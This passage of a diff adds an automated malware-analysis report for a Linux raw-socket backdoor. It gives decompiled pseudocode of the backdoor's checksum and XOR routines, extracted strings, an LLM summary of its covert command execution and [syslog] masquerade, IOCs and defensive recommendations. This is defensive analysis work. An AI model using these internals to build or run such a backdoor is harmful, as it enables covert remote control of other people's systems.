+        rdx += *((rbp - 0x20));
+        eax = *((rbp - 1));
+        *(rdx) = al;
+        *((rbp - 4))++;
+label_0:
+    } while (*((rbp - 4)) &lt;= 0x4af);
+label_2:
+    eax = 0;
+    pclose (*((rbp - 0x10)));
+    eax = *((rbp - 4));
+    *((rbp - 0x24)) = eax;
+label_1:
+    eax = *((rbp - 0x24));
+    return rax;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.udp_tcp_checksum</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x4016b8 */
+#include &lt;stdint.h&gt;
+ 
+uint64_t udp_tcp_checksum (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4) {
+    int64_t var_61ch;
+    int64_t var_618h;
+    int64_t var_60ch;
+    int64_t var_608h;
+    int64_t var_604h;
+    void  s;
+    int64_t var_20h;
+    int64_t var_1ch;
+    int64_t var_18h;
+    int64_t var_17h;
+    int64_t var_16h;
+    size_t n;
+    int64_t var_4h;
+    rsi = arg1;
+    rdx = arg2;
+    rcx = arg3;
+    r8 = arg4;
+    *((rbp - 0x608)) = esi;
+    *((rbp - 0x60c)) = edx;
+    *((rbp - 0x618)) = rcx;
+    eax = r8d;
+    *((rbp - 0x604)) = dil;
+    *((rbp - 0x61c)) = ax;
+    *((rbp - 6)) = 0xc;
+    eax = *((rbp - 0x60c));
+    *((rbp - 0x20)) = eax;
+    eax = *((rbp - 0x608));
+    *((rbp - 0x1c)) = eax;
+    *((rbp - 0x18)) = 0;
+    eax = *((rbp - 0x604));
+    *((rbp - 0x17)) = al;
+    edi = *((rbp - 0x61c));
+    ax = htons ();
+    *((rbp - 0x16)) = ax;
+    edx = *((rbp - 6));
+    eax = *((rbp - 0x61c));
+    eax = rdx + rax;
+    *((rbp - 4)) = eax;
+    memset (rbp - 0x600, 0, 0x5dc);
+    ecx = *((rbp - 6));
+    rax = rbp - 0x600;
+    rdx = rbp - 0x20;
+    rdi = rax;
+    rsi = rdx;
+    do {
+        *(rdi) = *(rsi);
+        rcx--;
+        rsi++;
+        rdi++;
+    } while (rcx != 0);
+    ecx = *((rbp - 0x61c));
+    eax = *((rbp - 6));
+    rdx = rax;
+    rax = rbp - 0x600;
+    rax += rdx;
+    rdx = *((rbp - 0x618));
+    rdi = rax;
+    rsi = rdx;
+    *(rdi) = *(rsi);
+    rcx--;
+    rsi++;
+    rdi++;
+    rdi = rbp - 0x600;
+    esi = *((rbp - 4));
+    ax = checksum ();
+    eax = (int32_t) ax;
+    return rax;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.__libc_csu_init</div>
+            <pre><code>//WARNING: Removing unreachable block (ram,0x004017fa)
+//WARNING: Removing unreachable block (ram,0x00401800)
+
+void sym.__libc_csu_init(ulong arg1,ulong arg2,ulong arg3)
+
+{
+    sym._init();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.checksum</div>
+            <pre><code>uint32_t sym.checksum(uint16_t *arg1,ulong arg2)
+
+{
+    int64_t iVar1;
+    int var_1ch;
+    uint16_t *var_18h;
+    uint64_t var_8h;
+    
+    var_8h = 0;
+    var_18h = arg1;
+    for (var_1ch = arg2; 1 &lt; var_1ch; var_1ch = var_1ch + -2) {
+        var_8h = var_8h + *var_18h;
+        var_18h = var_18h + 1;
+    }
+    if (var_1ch != 0) {
+        var_8h = var_8h + *var_18h;
+    }
+    iVar1 = (var_8h &gt;&gt; 0x10) + (var_8h &amp; 0xffff);
+    return ~(iVar1 + (iVar1 &gt;&gt; 0x10)) &amp; 0xffff;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.myDecryptFun</div>
+            <pre><code>//WARNING: Variable defined which should be unmapped: var_5h
+
+uint16_t sym.myDecryptFun(int64_t arg1,ulong noname_1,int64_t arg2,ulong noname_3,int64_t arg3)
+
+{
+    uint16_t in_CX;
+    uint8_t in_SIL;
+    ulong var_38h;
+    ulong var_28h;
+    ulong var_18h;
+    ulong var_5h;
+    
+    var_5h._0_1_ = 0;
+    for (var_5h._1_4_ = 0; var_5h._1_4_ &lt; in_CX; var_5h._1_4_ = var_5h._1_4_ + 1) {
+        if (in_SIL &lt;= var_5h) {
+            var_5h._0_1_ = 0;
+        }
+        *(var_5h._1_4_ + arg3) = *(var_5h._1_4_ + arg2) ^ *(var_5h + arg1);
+        var_5h._0_1_ = var_5h + 1;
+    }
+    return in_CX;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.myEncryptFun</div>
+            <pre><code>//WARNING: Variable defined which should be unmapped: var_5h
+
+uint16_t sym.myEncryptFun(int64_t arg1,ulong noname_1,int64_t arg2,ulong noname_3,int64_t arg3)
+
+{
+    uint16_t in_CX;
+    uint8_t in_SIL;
+    ulong var_38h;
+    ulong var_28h;
+    ulong var_18h;
+    ulong var_5h;
+    
+    var_5h._0_1_ = 0;
+    for (var_5h._1_4_ = 0; var_5h._1_4_ &lt; in_CX; var_5h._1_4_ = var_5h._1_4_ + 1) {
+        if (in_SIL &lt;= var_5h) {
+            var_5h._0_1_ = 0;
+        }
+        *(var_5h._1_4_ + arg3) = *(var_5h._1_4_ + arg2) ^ *(var_5h + arg1);
+        var_5h._0_1_ = var_5h + 1;
+    }
+    return in_CX;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.__do_global_dtors_aux</div>
+            <pre><code>//WARNING: Removing unreachable block (ram,0x00400b21)
+
+void sym.__do_global_dtors_aux(void)
+
+{
+    if (obj.completed.6145 == 0x0) {
+        obj.completed.6145 = 0x1;
+    }
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.__do_global_ctors_aux</div>
+            <pre><code>void sym.__do_global_ctors_aux(void)
+
+{
+    code *pcVar1;
+    code *pcVar2;
+    
+    pcVar2 = segment.LOAD1;
+    pcVar1 = _segment.LOAD1;
+    if (_segment.LOAD1 != 0xffffffffffffffff) {
+        do {
+            pcVar2 = pcVar2 + -8;
+            (*pcVar1)();
+            pcVar1 = *pcVar2;
+        } while (*pcVar2 != 0xffffffffffffffff);
+    }
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">entry0</div>
+            <pre><code>void entry0(ulong stack_end,ulong noname_1,ulong noname_2,ulong rtld_fini)
+
+{
+    ulong unaff_retaddr;
+    uchar auStack_8 [8];
+    
+    //[12] -r-x section size 3544 named .text
+    //WARNING: Subroutine does not return
+    sym.imp.__libc_start_main
+              (main,unaff_retaddr,&amp;stack0x00000008,sym.__libc_csu_init,sym.__libc_csu_fini,rtld_fini,auStack_8);
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.frame_dummy</div>
+            <pre><code>//WARNING: Removing unreachable block (ram,0x00400b68)
+
+void sym.frame_dummy(void)
+
+{
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym._init</div>
+            <pre><code>void sym._init(void)
+
+{
+    //[10] -r-x section size 24 named .init
+    sym.call_gmon_start();
+    sym.frame_dummy();
+    sym.__do_global_ctors_aux();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.call_gmon_start</div>
+            <pre><code>void sym.call_gmon_start(void)
+
+{
+    if (_reloc.__gmon_start__ != NULL) {
+        (*_reloc.__gmon_start__)();
+    }
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym._fini</div>
+            <pre><code>void sym._fini(void)
+
+{
+    //[13] -r-x section size 14 named .fini
+    sym.__do_global_dtors_aux();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.__sysv_signal</div>
+            <pre><code>void sym.imp.__sysv_signal(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x004008f8. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.__sysv_signal)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.printf</div>
+            <pre><code>void sym.imp.printf(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400908. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.printf)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.memset</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x400918 */
+#include &lt;stdint.h&gt;
+ 
+void memset (void) {
+    memset ();
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.puts</div>
+            <pre><code>void sym.imp.puts(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400928. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.puts)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.fseek</div>
+            <pre><code>void sym.imp.fseek(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400938. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.fseek)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.htons</div>
+            <pre><code>void sym.imp.htons(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400948. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.htons)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.exit</div>
+            <pre><code>void sym.imp.exit(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400958. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.exit)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.fopen</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x400968 */
+#include &lt;stdint.h&gt;
+ 
+void fopen (void) {
+    fopen ();
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.__libc_start_main</div>
+            <pre><code>void sym.imp.__libc_start_main(void)
+
+{
+    //WARNING: Could not recover jumptable at 0x00400978. Too many branches
+    //WARNING: Treating indirect jump as call
+    (*_reloc.__libc_start_main)();
+    return;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.imp.recv</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x400988 */
+#include &lt;stdint.h&gt;
+ 
+void recv (void) {
+    recv ();
+}</code></pre>
+        </div>
+
+        <!-- Strings -->
+        <h2 class="section-header">Strings (9 extracted)</h2>
+        <table class="data-table">
+            <thead><tr><th>Address</th><th>Value</th></tr></thead>
+            <tbody><tr><td class="mono">0x401898</td><td>socket(): %s\n</td></tr>
+<tr><td class="mono">0x4018a6</td><td>setsockopt error!</td></tr>
+<tr><td class="mono">0x4018b8</td><td>idkey not correct,%d!=%d\n</td></tr>
+<tr><td class="mono">0x4018d8</td><td>receive %d, cmd type is %d and cmdl is %d\n</td></tr>
+<tr><td class="mono">0x401906</td><td>system.conf</td></tr>
+<tr><td class="mono">0x401912</td><td>%d file data is received\n</td></tr>
+<tr><td class="mono">0x40192f</td><td>excute result is %s\n</td></tr>
+<tr><td class="mono">0x401944</td><td>send %d\n</td></tr>
+<tr><td class="mono">0x401950</td><td>server error: &#x27;%s&#x27; cannt execute\n</td></tr>
+</tbody>
+        </table>
+
+        <!-- LLM Synthesis (shared) -->
+        <h2 class="section-header">LLM Analysis Summary</h2>
+        <div style="font-size: 0.82rem; color: #6b7280; font-style: italic; margin-bottom: 8px;">
+            This summary was generated by the LLM using combined data from all active agents.
+        </div>
+        <div class="summary-box"><h3>1. Executive Summary</h3>
+<p class="mb-3">The analyzed binary is a Linux ELF backdoor that utilizes raw sockets for stealthy communication and remote command execution. The malware operates by creating a raw UDP socket, allowing it to send and receive packets without standard network stack restrictions, which requires root privileges. It implements a simple XOR-based encryption algorithm (<code>myEncryptFun</code>) to obfuscate command traffic and results, using a hardcoded key (<code>idkey</code>). Upon receiving a command, the binary decrypts it, executes the shell command using <code>popen</code>, captures the output, encrypts the response, and transmits it back to the controller via a custom-crafted UDP packet. The presence of raw socket usage and command execution capabilities indicates a high threat level suitable for remote control of compromised Linux hosts.</p>
+
+<h3>2. Malware Capabilities</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Raw Socket Communication</strong>: Creates a raw socket (<code>socket(AF_INET, SOCK_RAW, IPPROTO_UDP)</code>) to send and receive custom UDP packets, bypassing standard OS network layers.</li>
+<li class="mb-2"><strong>Remote Command Execution</strong>: Executes arbitrary shell commands on the host system using <code>popen</code> and returns the output to the attacker.</li>
+<li class="mb-2"><strong>Data Obfuscation</strong>: Employs a custom XOR encryption/decryption routine (<code>myEncryptFun</code>, <code>myDecryptFun</code>) to hide C2 traffic and payloads.</li>
+<li class="mb-2"><strong>Packet Crafting</strong>: Manually constructs network packet headers and calculates checksums (<code>udp_tcp_checksum</code>) for valid packet transmission.</li>
+<li class="mb-2"><strong>Process Stealth</strong>: Attempts to mask its presence or arguments by manipulating process name strings (referenced by <code>[syslog]</code>).</li>
+
+<h3>3. Binary Information</h3>
+<table class="w-full text-left border-collapse"><tr><th>Property</th><th>Value</th></tr><tr><td>SHA256</td><td>827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161</td></tr><tr><td>Architecture</td><td>x64</td></tr><tr><td>Type</td><td>ELF</td></tr><tr><td>Image Base</td><td>00400000</td></tr><tr><td>Entry Point</td><td>00400b78 (entry0)</td></tr><tr><td>Compiler</td><td>GCC 4.1.2 20080704 (Red Hat 4.1.2-55)</td></tr><tr><td>Size</td><td>Unknown</td></tr><tr><td>Packing</td><td>Unpacked</td></tr></table>
+
+<h3>4. Technical Analysis</h3>
+<strong>Raw Socket &amp; Communication (main)</strong>
+</ul>
+<p class="mb-3">The malware initializes by setting up a raw socket. In the <code>main</code> function (address <code>0x400b78</code>), it calls <code>socket(2, 3, 0x11)</code>, which corresponds to <code>AF_INET</code> (2), <code>SOCK_RAW</code> (3), and <code>IPPROTO_UDP</code> (17). This allows the binary to craft its own IP and UDP headers. It also sets a socket option using <code>setsockopt</code>, likely to enable broadcast capabilities or modify packet handling.</p>
+
+<strong>Command Execution (remoteExec)</strong>
+<p class="mb-3">The <code>remoteExec</code> function is responsible for running commands. It takes a command string, copies it to a local buffer, and calls <code>popen</code> to execute it in read mode. It reads the output character by character using <code>fgetc</code> and stores it in a buffer to be sent back to the attacker. Error handling includes a <code>perror</code> call if execution fails.</p>
+
+<strong>Encryption &amp; Data Handling (myEncryptFun)</strong>
+<p class="mb-3">To avoid detection, the malware uses a custom XOR cipher. The <code>myEncryptFun</code> function iterates through the data and XORs it with a key referenced as <code>idkey</code>.</p>
+
+<pre><code>// From myEncryptFun @ 0x4015ce
+for (local_c = 0; local_c &lt; (int)(uint)param_4; local_c = local_c + 1) {
+    if (param_2 &lt;= local_d) {
+      local_d = 0;
+    }
+    *(byte *)(local_c + param_5) =
+         *(byte *)(local_c + param_3) ^ *(byte *)((ulong)local_d + param_1);
+    local_d = local_d + 1;
+}
+</code></pre>
+
+<strong>Packet Transmission (sendResult2Peer)</strong>
+<p class="mb-3">This function prepares the data for transmission. It performs endianness conversion using <code>htons</code>, calculates the UDP checksum via <code>udp_tcp_checksum</code>, and likely calls <code>sendto</code> (though the call is at the end of the truncated decompilation, imports confirm its presence).</p>
+
+<h3>5. Functions Analysis</h3>
+
+<strong>main @ 0x400b78 (xrefs: 0 - entry point)</strong>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>Purpose</strong>: Entry point and orchestrator. Sets up the raw socket, configures signals, and manages the command loop.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>eax = socket (2, 3, 0x11);</code> followed by error checking and signal setup.</li>
+<li class="mb-2"><strong>Security Note</strong>: The use of <code>SOCK_RAW</code> requires root privileges (<code>CAP_NET_RAW</code>), indicating the target host must be compromised at a high level.</li>
+
+<strong>remoteExec @ 0x4010ce (xrefs: 1)</strong>
+<li class="mb-2"><strong>Purpose</strong>: Executes shell commands and captures the output.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>rax = popen (*((rbp - 0x18)), 0x40194d);</code> followed by a <code>while</code> loop reading with <code>fgetc</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: Provides the attacker with full shell access to the system.</li>
+
+<strong>sendResult2Peer @ 0x401216 (xrefs: 3)</strong>
+<li class="mb-2"><strong>Purpose</strong>: Encrypts command output and sends it back to the C2 server.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>myEncryptFun(&amp;idkey,4,param_4,param_5,local_18 + 0xc);</code> and checksum calculation.</li>
+<li class="mb-2"><strong>Security Note</strong>: Ensures C2 traffic is obfuscated to bypass simple network inspection.</li>
+
+<strong>myEncryptFun @ 0x4015ce (xrefs: 2)</strong>
+<li class="mb-2"><strong>Purpose</strong>: XOR encryption/decryption routine.</li>
+<li class="mb-2"><strong>Key Code</strong>: XOR loop logic using <code>idkey</code>.</li>
+<li class="mb-2"><strong>Security Note</strong>: Weak encryption (XOR) but sufficient to evade basic string-based detection.</li>
+
+<strong>checksum @ 0x4016b8 (xrefs: 2)</strong>
+<li class="mb-2"><strong>Purpose</strong>: Calculates standard internet checksum for IP/UDP packets.</li>
+<li class="mb-2"><strong>Key Code</strong>: <code>return ~((int)lVar1 + (int)((ulong)lVar1 &gt;&gt; 0x10)) &amp; 0xffff;</code></li>
+
+<h3>6. Operational Flow</h3>
+</ul>
+<ol class="list-decimal pl-6 mb-4">
+<li class="mb-2"><strong>Initialization</strong>: The binary starts, sets up signal handling (likely to ignore SIGHUP or handle termination), and creates a raw UDP socket (<code>main</code>).</li>
+<li class="mb-2"><strong>Setup</strong>: It manipulates the process name arguments to appear as <code>[syslog]</code> or similar to blend in.</li>
+<li class="mb-2"><strong>Main Operation</strong>: The malware enters a loop listening for incoming packets. When a packet is received, it decrypts the payload (<code>myDecryptFun</code>).</li>
+<li class="mb-2"><strong>Execution</strong>: The decrypted command is passed to <code>remoteExec</code> to be run via the shell.</li>
+<li class="mb-2"><strong>Exfiltration</strong>: The output of the command is encrypted (<code>myEncryptFun</code>) and sent back to the controller using <code>sendResult2Peer</code>.</li>
+
+<h3>7. C2 &amp; Networking</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">  <strong>C2 Servers</strong>: No hardcoded IPs/ Domains found in strings (likely determined by incoming packet source or packet inspection logic).</li>
+<li class="mb-2">  <strong>Protocols</strong>: UDP (Raw Sockets).</li>
+<li class="mb-2">  <strong>Communication Pattern</strong>: The malware listens on the wire for UDP packets. It parses the raw packet, validates the checksum, decrypts the payload, executes the command, and crafts a new raw UDP packet to send the result back to the source IP/Port of the received packet.</li>
+
+<h3>8. Evidence of Malicious Activity</h3>
+</ul>
+<li class="mb-2"><strong>Finding</strong>: Raw Socket Creation - Evidence: <code>socket (2, 3, 0x11)</code> in <code>main</code> @ 0x400b78.</li>
+<li class="mb-2"><strong>Finding</strong>: Command Execution Capability - Evidence: Import of <code>popen</code> and usage in <code>remoteExec</code> @ 0x4010ce.</li>
+<li class="mb-2"><strong>Finding</strong>: Encryption of C2 Traffic - Evidence: <code>myEncryptFun</code> function @ 0x4015ce and string &quot;idkey not correct,%d!=%d&quot;.</li>
+<li class="mb-2"><strong>Finding</strong>: Error Messages indicating server functionality - Evidence: String &quot;server error: &#x27;%s&#x27; cannt execute&quot;.</li>
+<li class="mb-2"><strong>Finding</strong>: File/Config Reference - Evidence: String &quot;system.conf&quot; found in the binary.</li>
+
+<h3>9. Recommendations</h3>
+<li class="mb-2">Restrict and monitor the use of raw sockets (<code>SOCK_RAW</code>) on Linux endpoints, as this capability is rarely required by legitimate user applications.</li>
+<li class="mb-2">Implement network monitoring to detect anomalies in UDP packet sizes and checksums that indicate crafted packets.</li>
+<li class="mb-2">Scan systems for the presence of the file hash <code>827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161</code>.</li>
+
+<h3>10. IOCs (Indicators of Compromise)</h3>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2">  <strong>File Hash</strong>: 827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161 - Malware binary</li>
+<li class="mb-2">  <strong>String</strong>: &quot;system.conf&quot; - Potential configuration file or artifact</li>
+<li class="mb-2">  <strong>String</strong>: &quot;server error: &#x27;%s&#x27; cannt execute&quot; - Specific error message in traffic or logs</li>
+<li class="mb-2">  <strong>String</strong>: &quot;idkey not correct,%d!=%d&quot; - Key validation error message</li>
+<li class="mb-2">  <strong>String</strong>: &quot;[syslog]&quot; - Process masquerading attempt</li>
+
+<h3>11. Conclusion</h3>
+</ul>
+</ol>
+<p class="mb-3">The analyzed binary is a Linux backdoor that leverages raw sockets for stealthy communication and XOR encryption for obfuscation. It allows an attacker to remotely execute arbitrary commands with the privileges of the infected process (likely root due to raw socket requirements). The lack of hardcoded C2 IPs suggests it may communicate with dynamic sources or rely on packet spoofing techniques.</p></div>
+
+        <!-- Footer -->
+        <div style="margin-top: 40px; padding-top: 16px; border-top: 1px solid #d1d5db; display: flex; justify-content: space-between; font-size: 11px; color: #9ca3af;">
+            <div>Confidential &amp; Proprietary</div>
+            <div>Generated by Radare2 Analysis Agent</div>
+        </div>
+    </div>
+</body>
+</html>
